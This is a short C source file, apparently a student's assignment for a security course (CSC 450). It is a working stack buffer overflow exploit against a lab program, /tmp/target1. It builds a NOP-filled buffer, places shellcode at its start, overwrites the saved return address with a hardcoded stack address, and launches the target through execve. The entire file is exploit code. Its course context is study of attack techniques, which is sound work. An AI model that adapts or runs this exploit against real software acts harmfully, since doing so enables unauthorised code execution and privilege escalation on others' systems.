/* sploit1.c
 *
 * William Ersing
 * CSC 450
 *
 * This buffer overflow exploit takes advantage of a flaw in target1.c
 * The flaw is that strcpy does no bounds checking, and the buffer can
 * be overflowed by any number of bytes (standard buffer overflow problem).
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"
#define BUFFSIZE 137                // 128 buffer + 4 ebp + 4 eip + NULL = 137

int main(void){
  char *args[3];
  char *env[1];
  char buf[BUFFSIZE];

  memset(buf, 0x90, BUFFSIZE - 1);      // Fill exploit string with NOPs
  memcpy(buf, shellcode, strlen(shellcode));    // Place shellcode at start of exploit string

  *(unsigned long *)(buf + 132) = 0xbffffd78;   // Point eip at shellcode in buffer

  buf[BUFFSIZE - 1] = 0;            // NULL terminate exploit string

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;

  if(0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
